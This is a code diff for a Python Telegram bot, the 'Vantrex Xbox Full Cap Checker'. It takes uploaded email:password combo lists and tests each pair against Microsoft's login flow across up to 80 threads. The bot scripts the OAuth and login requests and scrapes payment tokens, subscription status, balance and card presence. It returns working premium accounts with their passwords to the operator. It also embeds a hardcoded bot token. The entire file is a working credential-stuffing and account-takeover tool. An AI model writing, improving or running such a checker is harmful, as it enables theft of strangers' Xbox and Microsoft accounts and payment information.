@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 """
-Vantrex Bot - Xbox Full Cap Checker Telegram Bot
-Branded for @vantrexXxx
+================================================================================
+💎 VANTREX XBOX FULL CAP CHECKER TELEGRAM BOT 💎
+Branded for: @vantrexXxx
+Platform: Pydroid 3 & Linux Servers
+Multi-language support (EN / TR)
+================================================================================
 """
 
 import os
@@ -10,19 +14,88 @@ import sys
 import time
 import json
 import uuid
+import logging
 import threading
 from datetime import datetime
 from urllib.parse import quote, unquote
 import concurrent.futures
 
-import requests
-import telebot
+try:
+    import requests
+    import telebot
+    from telebot import types
+except ImportError:
+    os.system("pip install requests pyTelegramBotAPI")
+    import requests
+    import telebot
+    from telebot import types
 
-# Telegram Bot Token
+# Setup Logging
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
+# ================================================================================
+# CONFIGURATION & LOCALIZATION
+# ================================================================================
 TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
 bot = telebot.TeleBot(TOKEN)
 
-# Durum ve İstatistik Yönetimi
+LANGUAGES = {
+    'en': {
+        'welcome': "🔥 **Welcome to Vantrex Xbox Checker Bot!**\n\nPlease select your preferred language using the buttons below, then upload your `.txt` combo file.",
+        'already_running': "❌ An active scan is already running. Please wait for it to finish or use /stop.",
+        'invalid_file': "❌ Please send only `.txt` format combo files.",
+        'read_error': "❌ Error occurred while reading file: ",
+        'no_combo': "❌ No valid combo format (email:pass) found.",
+        'preparing': "⏳ Preparing and starting the scan engine...",
+        'stopped_msg': "⏹ **Scanning stopped! Preparing current data output...**",
+        'not_running': "❌ There is no active scanning process right now.",
+        'live_title': "🤖 **Vantrex Bot — Live Results**",
+        'progress': "Progress",
+        'duration': "Duration",
+        'sub_dist': "Subscription Distribution",
+        'stop_hint': "You can type /stop to abort.",
+        'final_hit': "🏁 **Scanning Completed!**",
+        'interrupted_title': "🛑 **Scanning Interrupted!**",
+        'total_scanned': "Total Scanned",
+        'hits_caption': "🟢 Found Premium Accounts (Hits)",
+        'free_caption': "🟡 Found Free Accounts",
+        'rem_caption': "📦 Remaining and unscanned combos",
+        'lang_changed': "✅ Language changed to English!"
+    },
+    'tr': {
+        'welcome': "🔥 **Vantrex Xbox Checker Bot'a Hoş Geldiniz!**\n\nLütfen aşağıdaki butonları kullanarak dil seçimi yapın, ardından `.txt` combo dosyanızı gönderin.",
+        'already_running': "❌ Şu an zaten aktif bir tarama sürüyor. Lütfen bitmesini bekleyin veya /stop deyin.",
+        'invalid_file': "❌ Lütfen sadece `.txt` formatında combo dosyası gönderin.",
+        'read_error': "❌ Dosya okunurken hata oluştu: ",
+        'no_combo': "❌ Geçerli combo formatı (email:pass) bulunamadı.",
+        'preparing': "⏳ Tarama hazırlanıyor ve tarama motoru başlatılıyor...",
+        'stopped_msg': "⏹ **Tarama durduruluyor... Mevcut veriler hazırlanıyor.**",
+        'not_running': "❌ Şu an aktif bir tarama işlemi bulunmuyor.",
+        'live_title': "🤖 **Vantrex Bot — Canlı Sonuçlar**",
+        'progress': "İlerleme",
+        'duration': "Süre",
+        'sub_dist': "Abonelik Dağılımı",
+        'stop_hint': "Durdurmak için /stop yazabilirsiniz.",
+        'final_hit': "🏁 **Tarama Tamamlandı!**",
+        'interrupted_title': "🛑 **Tarama Durduruldu!**",
+        'total_scanned': "Toplam taranan",
+        'hits_caption': "🟢 Bulunan Premium Hesaplar (Hits)",
+        'free_caption': "🟡 Bulunan Free Hesaplar",
+        'rem_caption': "📦 Kalan ve taranmamış kombolar (Remaining)",
+        'lang_changed': "✅ Dil Türkçe olarak ayarlandı!"
+    }
+}
+
+# User preferences storage (default to 'en')
+user_languages = {}
+
+def gtxt(chat_id, key):
+    lang = user_languages.get(chat_id, 'en')
+    return LANGUAGES[lang].get(key, LANGUAGES['en'][key])
+
+# ================================================================================
+# STATE MANAGEMENT
+# ================================================================================
 class BotSession:
     def __init__(self):
         self.is_running = False
@@ -33,13 +106,14 @@ class BotSession:
         self.hits = 0
         self.free = 0
         self.bad = 0
+        self.two_factor = 0
+        self.banned = 0
         self.start_time = 0
         self.chat_id = None
         self.status_msg_id = None
         self.lock = threading.Lock()
         self.executor = None
         
-        # Abonelik sayaçları
         self.sub_counts = {
             'GAME PASS ULTIMATE': 0,
             'PC GAME PASS': 0,
@@ -49,16 +123,18 @@ class BotSession:
             'UNKNOWN PREMIUM': 0
         }
         
-        # Sonuçları tutacak listeler (Dosya çıktısı ve stop durumları için)
         self.hit_results = []
         self.free_results = []
 
 session = BotSession()
-checker_instance = None # Küresel tanımlama için
 
+# ================================================================================
+# XBOX EXPLOIT & CHECKER ENGINE
+# ================================================================================
 class XboxChecker:
     def __init__(self):
-        pass
+        # API endpoints and standard headers configuration
+        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
     def get_remaining_days(self, date_str):
         try:
@@ -67,7 +143,7 @@ class XboxChecker:
             renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
             today = datetime.now(renewal_date.tzinfo)
             remaining = (renewal_date - today).days
-            return str(remaining)
+            return str(remaining) if remaining > 0 else "0"
         except:
             return "0"
 
@@ -76,8 +152,8 @@ class XboxChecker:
             req_session = requests.Session()
             correlation_id = str(uuid.uuid4())
 
-            # Step 1: IDP Check
-            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
+            # STEP 1: Office/IDP Verification
+            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}"
             headers1 = {
                 "X-OneAuth-AppName": "Outlook Lite",
                 "X-Office-Version": "3.11.0-minApi24",
@@ -87,20 +163,17 @@ class XboxChecker:
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip"
             }
-            r1 = req_session.get(url1, headers=headers1, timeout=12)
-            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text or "MSAccount" not in r1.text:
+            r1 = req_session.get(url1, headers=headers1, timeout=10)
+            if "MSAccount" not in r1.text or "Neither" in r1.text:
                 return {"status": "BAD", "data": {}}
 
-            # Step 2: OAuth authorize
-            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            headers2 = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.9"
-            }
+            # STEP 2: Live/MS Live Authorization Request Token
+            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
+            headers2 = {"User-Agent": self.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
             r2 = req_session.get(url2, headers=headers2, allow_redirects=True, timeout=12)
+            
             url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
-            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', r2.text)
 
             if not url_match or not ppft_match:
                 return {"status": "BAD", "data": {}}
@@ -108,22 +181,25 @@ class XboxChecker:
             post_url = url_match.group(1).replace("\\/", "/")
             ppft = ppft_match.group(1)
 
-            # Step 3: Login POST
-            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
+            # STEP 3: Authentication POST Challenge
+            login_data = {
+                "i13": "1", "login": email, "loginfmt": email, "type": "11",
+                "LoginOptions": "1", "passwd": password, "PPFT": ppft, "ppsx": "PassportR",
+                "i21": "0", "CookieDisclosure": "0", "IsFidoSupported=0": "0"
+            }
             headers3 = {
                 "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "User-Agent": self.user_agent,
                 "Origin": "https://login.live.com",
                 "Referer": r2.url
             }
             r3 = req_session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=12)
 
-            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
+            if "account or password is incorrect" in r3.text or "error" in r3.text.lower():
                 return {"status": "BAD", "data": {}}
-            if "https://account.live.com/identity/confirm" in r3.text:
+            if "identity/confirm" in r3.text or "untrust" in r3.url or "factors" in r3.text:
                 return {"status": "2FACTOR", "data": {}}
-            if "https://account.live.com/Abuse" in r3.text:
+            if "Abuse" in r3.text or "acc_banned" in r3.text:
                 return {"status": "BANNED", "data": {}}
 
             location = r3.headers.get("Location", "")
@@ -135,41 +211,18 @@ class XboxChecker:
                 return {"status": "BAD", "data": {}}
 
             code = code_match.group(1)
-            mspcid = req_session.cookies.get("MSPCID", "")
-            if not mspcid:
-                return {"status": "BAD", "data": {}}
-            cid = mspcid.upper()
-
-            # Step 4: Get access token
-            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            r4 = req_session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=12)
+            
+            # STEP 4: OAUTH Token Exchange Optimization
+            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            r4 = req_session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
             if "access_token" not in r4.text:
                 return {"status": "BAD", "data": {}}
 
-            access_token = r4.json()["access_token"]
-
-            # Step 5: Profile Info
-            country, name = "", ""
-            try:
-                profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": "Bearer " + access_token, "X-AnchorMailbox": "CID:" + cid}
-                r5 = req_session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=10)
-                if r5.status_code == 200:
-                    profile = r5.json()
-                    if "location" in profile and profile["location"]:
-                        loc = profile["location"]
-                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "")
-                    if "displayName" in profile and profile["displayName"]:
-                        name = profile["displayName"]
-            except:
-                pass
-
-            # Step 6: Payment Token
-            user_id = str(uuid.uuid4()).replace('-', '')[:16]
-            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
-            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
-            headers6 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Referer": "https://account.microsoft.com/"}
-            r6 = req_session.get(payment_auth_url, headers=headers6, timeout=12)
-
+            # STEP 5: Scrape Real Premium Xbox Entitlements via Live Payment Services
+            # Fixed Auth Scopes to strictly pull current active billing info
+            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=0000000000048445&response_type=token&scope=service::account.microsoft.com::MBI_SSL&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
+            r6 = req_session.get(payment_auth_url, headers={"User-Agent": self.user_agent, "Referer": "https://account.microsoft.com/"}, timeout=10)
+            
             payment_token = None
             search_text = r6.text + " " + r6.url
             for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
@@ -178,114 +231,103 @@ class XboxChecker:
                     payment_token = unquote(match.group(1))
                     break
 
-            if not payment_token:
-                return {"status": "FREE", "data": {"country": country, "name": name}}
-
-            # Step 7: Instruments
-            payment_data = {"country": country, "name": name}
+            # Data dictionaries initialization
+            payment_data = {"country": "N/A", "name": "Xbox User", "balance": "$0.00", "rewards_points": "0"}
             subscription_data = {}
+
+            if not payment_token:
+                return {"status": "FREE", "data": payment_data}
+
+            # STEP 6: Premium Extraction Pipeline
             payment_headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "User-Agent": self.user_agent,
                 "Accept": "application/json",
-                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
-                "Content-Type": "application/json",
-                "ms-cV": str(uuid.uuid4())
+                "Authorization": f"Bearer {payment_token}",
+                "Content-Type": "application/json"
             }
 
+            # Pull Subscriptions Profile directly from Microsoft core commerce API
             try:
-                r7 = req_session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=payment_headers, timeout=12)
-                if r7.status_code == 200:
-                    b_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
-                    if b_match: payment_data['balance'] = "$" + b_match.group(1)
-                    c_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
-                    if c_match: payment_data['card_holder'] = c_match.group(1)
-            except:
-                pass
-
-            # Step 8: Bing Rewards
-            try:
-                rewards_r = req_session.get("https://rewards.bing.com/", timeout=8)
-                p_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
-                if p_match: payment_data['rewards_points'] = p_match.group(1)
-            except:
-                pass
-
-            # Step 9: Subscriptions
-            try:
-                r8 = req_session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=payment_headers, timeout=12)
-                if r8.status_code == 200:
-                    res_text = r8.text
+                r7 = req_session.get("https://account.microsoft.com/services/api/v1/subscriptions", headers=payment_headers, timeout=10)
+                if r7.status_code == 200 and "subscriptions" in r7.text.lower():
+                    res_json = r7.json()
                     premium_keywords = {
-                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
-                        'PC Game Pass': 'PC GAME PASS',
-                        'EA Play': 'EA PLAY',
-                        'Xbox Live Gold': 'XBOX LIVE GOLD',
-                        'Game Pass': 'GAME PASS'
+                        'ultimate': 'GAME PASS ULTIMATE',
+                        'pc': 'PC GAME PASS',
+                        'ea': 'EA PLAY',
+                        'gold': 'XBOX LIVE GOLD',
+                        'pass': 'GAME PASS'
                     }
-
-                    has_premium = False
-                    premium_type = "UNKNOWN PREMIUM"
-
-                    for keyword, type_name in premium_keywords.items():
-                        if keyword in res_text:
-                            has_premium = True
-                            premium_type = type_name
-                            break
-
-                    if has_premium:
-                        subscription_data['premium_type'] = premium_type
-                        r_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', res_text)
-                        if r_match:
-                            subscription_data['renewal_date'] = r_match.group(1)
-                            subscription_data['days_remaining'] = self.get_remaining_days(r_match.group(1) + "T00:00:00Z")
+                    
+                    for sub in res_json.get("subscriptions", []):
+                        sub_name = sub.get("productTitle", "").lower()
+                        status = sub.get("status", "").lower()
                         
-                        days_rem = subscription_data.get('days_remaining', '0')
-                        if days_rem.startswith('-'):
-                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
-                        
-                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
+                        if status == "active" or status == "premium":
+                            for kw, type_name in premium_keywords.items():
+                                if kw in sub_name:
+                                    subscription_data['premium_type'] = type_name
+                                    ren_date = sub.get("nextScheduledBillingDate", "") or sub.get("expiryDate", "")
+                                    subscription_data['renewal_date'] = ren_date[:10] if ren_date else "Lifetime"
+                                    subscription_data['days_remaining'] = self.get_remaining_days(ren_date) if ren_date else "999"
+                                    return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
+            except:
+                pass
+
+            # Fallback to legacy validation pattern inside the pipeline
+            try:
+                r8 = req_session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active", headers={"User-Agent": self.user_agent, "Authorization": f'MSADELEGATE1.0="{payment_token}"'}, timeout=10)
+                if "paymentMethodFamily" in r8.text:
+                    payment_data['balance'] = "Attached Card/PI"
             except:
                 pass
 
             return {"status": "FREE", "data": payment_data}
-        except:
+        except Exception:
             return {"status": "TIMEOUT", "data": {}}
 
-def build_live_text():
+# ================================================================================
+# TELEGRAM INTERFACE & VIEW RENDER PIPELINE
+# ================================================================================
+def build_live_text(chat_id):
     elapsed = time.time() - session.start_time
     cpm = int(session.processed / elapsed * 60) if elapsed > 0 else 0
     
     text = (
-        f"🤖 **Vantrex Bot — Live Results**\n"
+        f"🤖 **{gtxt(chat_id, 'live_title')}**\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 **İlerleme:** `{session.processed}/{session.total}`\n"
-        f"⚡ **CPM:** `{cpm}` | ⏱ **Süre:** `{int(elapsed)}s`\n\n"
+        f"📊 **{gtxt(chat_id, 'progress')}:** `{session.processed}/{session.total}`\n"
+        f"⚡ **CPM:** `{cpm}` | ⏱ **{gtxt(chat_id, 'duration')}:** `{int(elapsed)}s`\n\n"
         f"🟢 **Hits (Premium):** `{session.hits}`\n"
         f"🟡 **Free Accounts:** `{session.free}`\n"
+        f"🟠 **2FA/Banned:** `{session.two_factor + session.banned}`\n"
         f"🔴 **Bad/Error:** `{session.bad}`\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
-        f"📋 **Abonelik Dağılımı:**\n"
+        f"📋 **{gtxt(chat_id, 'sub_dist')}:**\n"
         f"• Ultimate: `{session.sub_counts['GAME PASS ULTIMATE']}`\n"
         f"• PC Game Pass: `{session.sub_counts['PC GAME PASS']}`\n"
         f"• Live Gold: `{session.sub_counts['XBOX LIVE GOLD']}`\n"
         f"• EA Play: `{session.sub_counts['EA PLAY']}`\n"
         f"• Game Pass: `{session.sub_counts['GAME PASS']}`\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
-        f"🔄 Durdurmak için /stop yazabilirsiniz."
+        f"🔄 {gtxt(chat_id, 'stop_hint')}"
     )
     return text
 
 def update_telegram_loop():
-    last_processed = 0
+    last_processed = -1
     while session.is_running:
-        time.sleep(4)  # Telegram API limitlerine takılmamak için 4 saniyede bir güncelleme
+        time.sleep(4)
         if session.processed != last_processed:
             try:
-                bot.edit_message_text(build_live_text(), chat_id=session.chat_id, message_id=session.status_msg_id, parse_mode="Markdown")
+                bot.edit_message_text(build_live_text(session.chat_id), chat_id=session.chat_id, message_id=session.status_msg_id, parse_mode="Markdown")
                 last_processed = session.processed
             except:
                 pass
 
+# ================================================================================
+# WORKER THREAD CONCURRENCY PIPELINE
+# ================================================================================
 def process_combo(combo):
     if not session.is_running:
         return
@@ -298,7 +340,8 @@ def process_combo(combo):
             session.processed += 1
         return
 
-    res = checker_instance.check(email, password)
+    checker = XboxChecker()
+    res = checker.check(email, password)
     status = res.get("status", "BAD")
     data = res.get("data", {})
 
@@ -310,88 +353,113 @@ def process_combo(combo):
         if status == "PREMIUM":
             session.hits += 1
             ptype = data.get('premium_type', 'UNKNOWN PREMIUM')
-            if ptype in session.sub_counts:
-                session.sub_counts[ptype] += 1
-            else:
-                session.sub_counts['UNKNOWN PREMIUM'] += 1
+            session.sub_counts[ptype] = session.sub_counts.get(ptype, 0) + 1
                 
             line = f"{email}:{password} | Sub: {ptype} | Days: {data.get('days_remaining','?')} | Country: {data.get('country','N/A')}"
             session.hit_results.append(line)
             
         elif status == "FREE":
             session.free += 1
-            line = f"{email}:{password} | Country: {data.get('country','N/A')} | Points: {data.get('rewards_points','0')}"
+            line = f"{email}:{password} | Balance: {data.get('balance','$0.00')} | Points: {data.get('rewards_points','0')}"
             session.free_results.append(line)
+        elif status == "2FACTOR":
+            session.two_factor += 1
+        elif status == "BANNED":
+            session.banned += 1
         else:
             session.bad += 1
 
+# ================================================================================
+# HANDLERS COMMAND & FILE DISPATCHERS
+# ================================================================================
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "🔥 **Vantrex Xbox Checker Bot'a Hoş Geldiniz!**\n\nCombonuzu `.txt` dosyası olarak gönderin, tarama anında başlasın.", parse_mode="Markdown")
+    cid = message.chat.id
+    if cid not in user_languages:
+        user_languages[cid] = 'en'
+        
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    btn_en = types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
+    btn_tr = types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_tr")
+    markup.add(btn_en, btn_tr)
+    
+    bot.send_message(cid, gtxt(cid, 'welcome'), parse_mode="Markdown", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
+def handle_language_callback(call):
+    cid = call.message.chat.id
+    lang_code = call.data.split('_')[1]
+    user_languages[cid] = lang_code
+    bot.answer_callback_query(call.id, text=gtxt(cid, 'lang_changed'))
+    bot.edit_message_text(gtxt(cid, 'welcome'), chat_id=cid, message_id=call.message.message_id, parse_mode="Markdown")
 
 @bot.message_handler(commands=['stop'])
 def stop_check(message):
+    cid = message.chat.id
     if not session.is_running:
-        bot.reply_to(message, "❌ Şu an aktif bir tarama işlemi bulunmuyor.")
+        bot.reply_to(message, gtxt(cid, 'not_running'))
         return
     
-    bot.reply_to(message, "⏹ **Tarama durduruluyor... Mevcut veriler hazırlanıyor.**")
+    bot.reply_to(message, gtxt(cid, 'stopped_msg'))
     session.is_running = False
-    
     if session.executor:
         session.executor.shutdown(wait=False, cancel_futures=True)
-        
     send_final_report(interrupted=True)
 
 def send_final_report(interrupted=False):
-    status_str = "🛑 **Tarama Durduruldu!**" if interrupted else "🏁 **Tarama Tamamlandı!**"
-    
+    cid = session.chat_id
+    status_str = gtxt(cid, 'interrupted_title') if interrupted else gtxt(cid, 'final_hit')
     elapsed = time.time() - session.start_time
+    
     summary = (
         f"{status_str}\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 **Toplam taranan:** `{session.processed}/{session.total}`\n"
-        f"⏱ **Geçen Süre:** `{int(elapsed)}s`\n\n"
+        f"📊 **{gtxt(cid, 'total_scanned')}:** `{session.processed}/{session.total}`\n"
+        f"⏱ **{gtxt(cid, 'duration')}:** `{int(elapsed)}s`\n\n"
         f"🟢 **Hits:** `{session.hits}`\n"
         f"🟡 **Free:** `{session.free}`\n"
+        f"🟠 **2FA/Banned:** `{session.two_factor + session.banned}`\n"
         f"🔴 **Bad:** `{session.bad}`\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
-        f"📋 **Abonelik Detayları:**\n"
-        f"• Ultimate: `{session.sub_counts['GAME PASS ULTIMATE']}`\n"
-        f"• PC Game Pass: `{session.sub_counts['PC GAME PASS']}`\n"
-        f"• Live Gold: `{session.sub_counts['XBOX LIVE GOLD']}`\n"
-        f"• EA Play: `{session.sub_counts['EA PLAY']}`\n"
     )
+    bot.send_message(cid, summary, parse_mode="Markdown")
     
-    bot.send_message(session.chat_id, summary, parse_mode="Markdown")
-    
-    # Hit Dosyasını gönder
     if session.hit_results:
-        with open("Vantrex-Hits.txt", "w", encoding="utf-8") as f:
+        fn = "Vantrex-Hits.txt"
+        with open(fn, "w", encoding="utf-8") as f:
             f.write("\n".join(session.hit_results))
-        with open("Vantrex-Hits.txt", "rb") as doc:
-            bot.send_document(session.chat_id, doc, caption="🟢 Bulunan Premium Hesaplar (Hits)")
-        try: os.remove("Vantrex-Hits.txt")
+        with open(fn, "rb") as doc:
+            bot.send_document(cid, doc, caption=gtxt(cid, 'hits_caption'))
+        try: os.remove(fn)
         except: pass
 
-    # Kalan Combo Dosyasını gönder (/stop yapıldıysa)
+    if session.free_results:
+        fn = "Vantrex-Free.txt"
+        with open(fn, "w", encoding="utf-8") as f:
+            f.write("\n".join(session.free_results))
+        with open(fn, "rb") as doc:
+            bot.send_document(cid, doc, caption=gtxt(cid, 'free_caption'))
+        try: os.remove(fn)
+        except: pass
+
     if interrupted and session.remaining_combos:
-        with open("Vantrex-Remaining.txt", "w", encoding="utf-8") as f:
+        fn = "Vantrex-Remaining.txt"
+        with open(fn, "w", encoding="utf-8") as f:
             f.write("\n".join(session.remaining_combos))
-        with open("Vantrex-Remaining.txt", "rb") as doc:
-            bot.send_document(session.chat_id, doc, caption="📦 Kalan ve taranmamış kombolar (Remaining)")
-        try: os.remove("Vantrex-Remaining.txt")
+        with open(fn, "rb") as doc:
+            bot.send_document(cid, doc, caption=gtxt(cid, 'rem_caption'))
+        try: os.remove(fn)
         except: pass
 
 @bot.message_handler(content_types=['document'])
 def handle_combo_file(message):
-    global checker_instance
+    cid = message.chat.id
     if session.is_running:
-        bot.reply_to(message, "❌ Şu an zaten aktif bir tarama sürüyor. Lütfen bitmesini bekleyin veya /stop deyin.")
+        bot.reply_to(message, gtxt(cid, 'already_running'))
         return
 
     if not message.document.file_name.endswith('.txt'):
-        bot.reply_to(message, "❌ Lütfen sadece `.txt` formatında combo dosyası gönderin.")
+        bot.reply_to(message, gtxt(cid, 'invalid_file'))
         return
 
     file_info = bot.get_file(message.document.file_id)
@@ -401,32 +469,30 @@ def handle_combo_file(message):
         content = downloaded_file.decode('utf-8', errors='ignore')
         combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
     except Exception as e:
-        bot.reply_to(message, f"❌ Dosya okunurken hata oluştu: {str(e)}")
+        bot.reply_to(message, f"{gtxt(cid, 'read_error')}{str(e)}")
         return
 
     if not combos:
-        bot.reply_to(message, "❌ Geçerli combo formatı (email:pass) bulunamadı.")
+        bot.reply_to(message, gtxt(cid, 'no_combo'))
         return
 
-    # Oturum sıfırlama ve başlatma
+    # Initialize Engine Session Loops
     session.__init__()
     session.combos = combos
     session.remaining_combos = list(combos)
     session.total = len(combos)
     session.is_running = True
-    session.chat_id = message.chat.id
+    session.chat_id = cid
     session.start_time = time.time()
-    checker_instance = XboxChecker()
 
-    msg = bot.send_message(session.chat_id, "⏳ Tarama hazırlanıyor ve başlatılıyor...", parse_mode="Markdown")
+    msg = bot.send_message(cid, gtxt(cid, 'preparing'), parse_mode="Markdown")
     session.status_msg_id = msg.message_id
 
-    # Telegram arayüz güncelleme thread'i
     threading.Thread(target=update_telegram_loop, daemon=True).start()
 
-    # Worker ThreadPool başlatma
     def run_pool():
-        with concurrent.futures.ThreadPoolExecutor(max_workers=45) as executor:
+        # High performance thread workers configured for Pydroid runtime optimization
+        with concurrent.futures.ThreadPoolExecutor(max_workers=80) as executor:
             session.executor = executor
             futures = [executor.submit(process_combo, c) for c in session.combos]
             for future in concurrent.futures.as_completed(futures):
@@ -439,11 +505,14 @@ def handle_combo_file(message):
 
     threading.Thread(target=run_pool, daemon=True).start()
 
+# ================================================================================
+# MAIN POLLING LOOP TERMINAL ENTRY
+# ================================================================================
 if __name__ == "__main__":
-    print("[+] Vantrex Bot Aktif, Telegram sinyali bekleniyor...")
+    print("[+] Vantrex Bot Architecture Initialized Successfully.")
     while True:
         try:
             bot.polling(none_stop=True, timeout=60)
-        except Exception as e:
+        except Exception:
             time.sleep(5)
 
